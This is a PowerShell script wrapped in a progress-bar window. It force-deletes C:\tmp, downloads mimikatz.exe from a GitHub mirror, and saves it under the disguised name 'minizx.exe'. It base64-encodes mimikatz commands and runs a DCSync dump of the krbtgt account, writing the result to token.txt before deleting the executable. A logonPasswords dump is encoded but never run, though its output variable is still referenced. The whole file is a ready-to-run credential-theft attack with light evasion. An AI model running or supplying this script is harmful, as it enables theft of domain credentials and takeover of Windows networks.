Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
 
 
 
# Create a new form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Script Progress"
$form.Size = New-Object System.Drawing.Size(500, 300)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::Black
 
 
 
# Define custom colors
$matrixGreen = [System.Drawing.ColorTranslator]::FromHtml("#00ff00")  # Bright Matrix green
$brightOrange = [System.Drawing.ColorTranslator]::FromHtml("#FFA500") # Bright orange
$brightRed = [System.Drawing.ColorTranslator]::FromHtml("#FF0000")    # Bright red
$brightWhite = [System.Drawing.ColorTranslator]::FromHtml("#FFFFFF")  # Bright white
 
 
 
# Create a RichTextBox to display status updates
$statusBox = New-Object System.Windows.Forms.RichTextBox
$statusBox.Size = New-Object System.Drawing.Size(460, 220)
$statusBox.Location = New-Object System.Drawing.Point(10, 10)
$statusBox.ReadOnly = $true
$statusBox.BackColor = [System.Drawing.Color]::Black
$statusBox.ForeColor = $brightWhite
$statusBox.Font = New-Object System.Drawing.Font("Consolas", 10)
$statusBox.ScrollBars = "Vertical"
$form.Controls.Add($statusBox)
 
 
 
# Create a progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(10, 240)
$progressBar.Size = New-Object System.Drawing.Size(460, 20)
$progressBar.Minimum = 0
$progressBar.Maximum = 10
$progressBar.ForeColor = [System.Drawing.Color]::Red
$form.Controls.Add($progressBar)
 
 
 
# Function to update status
function Update-Status {
  param (
      [string]$Message,
      [System.Drawing.Color]$Color,
      [int]$Progress
  )
  $statusBox.SelectionStart = $statusBox.TextLength
  $statusBox.SelectionLength = 0
  $statusBox.SelectionColor = $Color
  $statusBox.AppendText("$Message`n")
  $statusBox.ScrollToCaret()
  $progressBar.Value = $Progress
  $form.Refresh()
}
 
 
 
# Show the form
$form.Show()
 
 
 
 
 
# Ensure the directory exists
$targetDirectory = "C:\tmp"
 
# Remove Existing Tmp Folder if possible
 
Remove-Item -Path $targetDirectory -Force -Recurse > $null
Update-Status "Step 1/10: Checking if the target directory exists..." $brightOrange 1
Start-Sleep -Seconds 1
 
 
 
if (-Not (Test-Path -Path $targetDirectory)) {
  Update-Status "Step 2/10: Target directory not found. Creating directory..." $brightRed 2
  Start-Sleep -Seconds 1
  New-Item -ItemType Directory -Path $targetDirectory
  Update-Status "Step 3/10: Target directory created." $matrixGreen 3
  Start-Sleep -Seconds 1
} else {
  Update-Status "Step 3/10: Target directory already exists." $matrixGreen 3
  Start-Sleep -Seconds 1
}
 
 
 
# Define the URL to download the executable from
$url = "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimikatz.exe"
$targetFilePath = "$targetDirectory\minizx.exe"
 
 
 
# Download the executable
Update-Status "Step 4/10: Downloading the executable from $url..." $brightOrange 4
Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $url -OutFile $targetFilePath
Update-Status "Step 5/10: Download complete. File saved to $targetFilePath." $matrixGreen 5
Start-Sleep -Seconds 1
 
 
 
# Encoding commands
Update-Status "Step 6/10: Encoding commands..." $brightOrange 6
Start-Sleep -Seconds 1
$cmd1 = "Lsadump::dcsync /user:krbtgt"
$cmd2 = "privilege::debug sekurlsa::logonPasswords"
$encodedCmd1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd1))
$encodedCmd2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd2))
Update-Status "Step 7/10: Commands encoded." $matrixGreen 7
Start-Sleep -Seconds 1
 
 
 
# Execution of commands and storing output
Update-Status "Step 8/10: Executing encoded command Lsadump::dcsync /user:k..." $brightOrange 8
Start-Sleep -Seconds 1
$output1 = & $targetFilePath ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedCmd1))) exit
Update-Status "Step 9/10: Command 1 execution complete." $matrixGreen 9
Start-Sleep -Seconds 1
 
 
 
# Store the output in token.txt
Update-Status "Step 10/10: Storing the output in token.txt..." $brightOrange 10
Start-Sleep -Seconds 1
Set-Content 'C:\tmp\token.txt' $output1
Add-Content 'C:\tmp\token.txt' "`n$output2"
Update-Status "Output stored." $matrixGreen 10
Start-Sleep -Seconds 1
 
 
 
# Pause message
$pauseMessage = "Press any key to continue"
Add-Content 'C:\tmp\token.txt' "`n$pauseMessage"
Update-Status "Opening token.txt in Notepad..." $brightOrange 10
Start-Sleep -Seconds 1
notepad C:\tmp\token.txt
 
 
 
Update-Status "DANGER: Script complete. Check token.txt." $brightRed 10
Start-Sleep -Seconds 1
 
 
 
# Remove the executable
Update-Status "Removing minizx.exe..." $brightRed 10
Remove-Item -Path $targetFilePath -Force
Update-Status "minizx.exe removed." $matrixGreen 10
Start-Sleep -Seconds 1